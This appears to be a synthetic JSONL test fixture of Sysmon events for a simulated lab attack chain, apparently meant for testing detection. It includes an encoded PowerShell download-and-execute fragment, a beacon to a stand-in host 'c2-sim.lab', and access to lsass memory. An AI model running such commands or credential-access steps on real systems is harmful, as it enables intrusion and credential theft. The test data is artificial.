{"event_time_raw": "2026-09-07T08:00:01Z", "ingested_time": "2026-09-07T08:00:01Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:00:01Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-09-07T08:00:01.0000000Z\"/><EventRecordID>8802</EventRecordID><Computer>win-client-01.corp.lab</Computer><Security UserID=\"S-1-5-18\"/></System>\n  <EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-09-07 08:00:01.000</Data><Data Name=\"ProcessGuid\">{C5B9A8A4-5C01-68BD-7100-000000000900}</Data><Data Name=\"ProcessId\">4240</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"FileVersion\">10.0.19041.1</Data><Data Name=\"Description\">Windows PowerShell</Data><Data Name=\"CommandLine\">powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA</Data><Data Name=\"CurrentDirectory\">C:\\Users\\student\\</Data><Data Name=\"User\">CORP\\student</Data><Data Name=\"LogonGuid\">{C5B9A8A4-5C00-68BD-8A91-000000000000}</Data><Data Name=\"LogonId\">0x8A91C</Data><Data Name=\"TerminalSessionId\">2</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"Hashes\">SHA256=26CDE23A5C911E7D72A09C0C2D7F44CCEE5F31AEFBF29960BA5D8506392A5F0B</Data><Data Name=\"ParentProcessGuid\">{C5B9A8A4-5BFE-68BD-7000-000000000900}</Data><Data Name=\"ParentProcessId\">3896</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">cmd.exe /c powershell.exe</Data><Data Name=\"ParentUser\">CORP\\student</Data></EventData>\n</Event>\n\n", "payload_format": "xml", "raw_id": "raw_3fd2bf561ac66dd586401e02", "raw_ref": "fixture://full_multisource_attack_chain/../powershell_cross_source/sysmon_1_process_create.xml", "raw_sha256": "1867d84cfa38c521c38f0b2e7cf6e583f7882849c997ce2272e688d395df5ca6", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "win-client-01.corp.lab", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-client-01", "source_record_id": "exec-1"}, "source_record_id": "exec-1"}
{"event_time_raw": "2026-09-07T08:00:02Z", "ingested_time": "2026-09-07T08:00:02Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:00:02Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-09-07T08:00:02.0000000Z\"/><EventRecordID>8803</EventRecordID><Computer>win-client-01.corp.lab</Computer><Security UserID=\"S-1-5-18\"/></System>\n  <EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-09-07 08:00:02.000</Data><Data Name=\"ProcessGuid\">{C5B9A8A4-5C01-68BD-7100-000000000900}</Data><Data Name=\"ProcessId\">4240</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"User\">CORP\\student</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIsIpv6\">false</Data><Data Name=\"SourceIp\">10.10.20.15</Data><Data Name=\"SourceHostname\">win-client-01.corp.lab</Data><Data Name=\"SourcePort\">49721</Data><Data Name=\"SourcePortName\">-</Data><Data Name=\"DestinationIsIpv6\">false</Data><Data Name=\"DestinationIp\">10.10.40.50</Data><Data Name=\"DestinationHostname\">c2-sim.lab</Data><Data Name=\"DestinationPort\">443</Data><Data Name=\"DestinationPortName\">https</Data></EventData>\n</Event>\n\n", "payload_format": "xml", "raw_id": "raw_63d5f83923d2a4c86b6f18e6", "raw_ref": "fixture://full_multisource_attack_chain/../powershell_cross_source/sysmon_3_network_connect.xml", "raw_sha256": "1f7ef2ea765b1d677da82010f17f27254185e2227aaed48599df6656de089d2b", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "win-client-01.corp.lab", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-client-01", "source_record_id": "c2-3"}, "source_record_id": "c2-3"}
{"event_time_raw": "2026-09-07T08:02:03.100Z", "ingested_time": "2026-09-07T08:02:03.100000Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:03.100000Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><EventID>11</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:03.100Z\"/><Computer>10.10.30.20</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:03.100</Data><Data Name=\"ProcessGuid\">{44444444-4444-4444-4444-444444444444}</Data><Data Name=\"ProcessId\">4321</Data><Data Name=\"Image\">C:\\Windows\\System32\\reg.exe</Data><Data Name=\"TargetFilename\">C:\\ProgramData\\stage.tmp</Data><Data Name=\"User\">CORP\\svc-backup</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_5f1800267762c85b84fff311", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_file_11.xml", "raw_sha256": "585fb8eaf29f065381fd473cf986c9d5e21165c7178537f21683d888cb5015ab", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "10.10.30.20", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-server-02", "source_record_id": "file-11"}, "source_record_id": "file-11"}
{"event_time_raw": "2026-09-07T08:02:03.300Z", "ingested_time": "2026-09-07T08:02:03.300000Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:03.300000Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><EventID>23</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:03.300Z\"/><Computer>10.10.30.20</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:03.300</Data><Data Name=\"ProcessGuid\">{44444444-4444-4444-4444-444444444444}</Data><Data Name=\"ProcessId\">4321</Data><Data Name=\"Image\">C:\\Windows\\System32\\reg.exe</Data><Data Name=\"TargetFilename\">C:\\ProgramData\\stage.tmp</Data><Data Name=\"User\">CORP\\svc-backup</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_aa240c24e1a49a018b707539", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_file_23.xml", "raw_sha256": "fa1162efe30934a9c2d722e863ae90c92bbbf41d21ebb667098ecc34129df3ff", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "10.10.30.20", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-server-02", "source_record_id": "file-23"}, "source_record_id": "file-23"}
{"event_time_raw": "2026-09-07T08:02:03.400Z", "ingested_time": "2026-09-07T08:02:03.400000Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:03.400000Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><EventID>5</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:03.400Z\"/><Computer>win-client-01.corp.lab</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:03.400</Data><Data Name=\"ProcessGuid\">{11111111-1111-1111-1111-111111111111}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"User\">CORP\\alice</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_eb3e728e9ef60549f69d86f8", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_process_5.xml", "raw_sha256": "67c1906d91e6deb1323bab765c9a261f56225505c01b3cd734d9d0473c734fdc", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "win-client-01.corp.lab", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-client-01", "source_record_id": "process-5"}, "source_record_id": "process-5"}
{"event_time_raw": "2026-09-07T08:02:03.500Z", "ingested_time": "2026-09-07T08:02:03.500000Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:03.500000Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><EventID>8</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:03.500Z\"/><Computer>10.10.30.20</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:03.500</Data><Data Name=\"SourceProcessGuid\">{44444444-4444-4444-4444-444444444444}</Data><Data Name=\"SourceProcessId\">4321</Data><Data Name=\"SourceImage\">C:\\ProgramData\\updater.exe</Data><Data Name=\"TargetProcessGuid\">{55555555-5555-5555-5555-555555555555}</Data><Data Name=\"TargetProcessId\">4400</Data><Data Name=\"TargetImage\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"StartAddress\">0x000001A00000</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_e031078adac15fed671cc1fb", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_memory_8.xml", "raw_sha256": "08590a12dbb333f0f5168291a2650f98fec3637ce335a51ab98b5c12b8c51592", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "10.10.30.20", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-server-02", "source_record_id": "memory-8"}, "source_record_id": "memory-8"}
{"event_time_raw": "2026-09-07T08:02:03.600Z", "ingested_time": "2026-09-07T08:02:03.600000Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:03.600000Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><EventID>10</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:03.600Z\"/><Computer>10.10.30.20</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:03.600</Data><Data Name=\"SourceProcessGuid\">{44444444-4444-4444-4444-444444444444}</Data><Data Name=\"SourceProcessId\">4321</Data><Data Name=\"SourceImage\">C:\\ProgramData\\updater.exe</Data><Data Name=\"TargetProcessGuid\">{55555555-5555-5555-5555-555555555555}</Data><Data Name=\"TargetProcessId\">4400</Data><Data Name=\"TargetImage\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"GrantedAccess\">0x1FFFFF</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_8b1232ca5fda0f0eba3b71a2", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_memory_10.xml", "raw_sha256": "000c6f3923c6cfefd7aa4669426bbaf99f9f29b55990dc70fb4b22f2a3bf98a8", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "10.10.30.20", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-server-02", "source_record_id": "memory-10"}, "source_record_id": "memory-10"}
{"event_time_raw": "2026-09-07T08:02:04Z", "ingested_time": "2026-09-07T08:02:04Z", "labels": {"ground_truth_ref": "manifest.json#ground_truth", "scenario_id": "full_multisource_attack_chain", "traffic_class": null}, "observed_time": "2026-09-07T08:02:04Z", "payload": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\"/><EventID>25</EventID><TimeCreated SystemTime=\"2026-09-07T08:02:04.0000000Z\"/><Computer>10.10.30.20</Computer></System><EventData><Data Name=\"UtcTime\">2026-09-07 08:02:04.000</Data><Data Name=\"ProcessGuid\">{55555555-5555-5555-5555-555555555555}</Data><Data Name=\"ProcessId\">4400</Data><Data Name=\"Image\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"Type\">Image is replaced</Data><Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data></EventData></Event>\n", "payload_format": "xml", "raw_id": "raw_0aee534a70bbc233a3cfd956", "raw_ref": "fixture://full_multisource_attack_chain/sysmon_memory_25.xml", "raw_sha256": "239939a1552392e0ba205d8b0b0999dff766d197b18adc44600ceca29783a464", "schema_version": "1.0", "source": {"dataset": "sysmon.operational", "host_hint": "10.10.30.20", "kind": "sysmon", "product": "Microsoft Windows", "sensor_id": "win-server-02", "source_record_id": "memory-25"}, "source_record_id": "memory-25"}
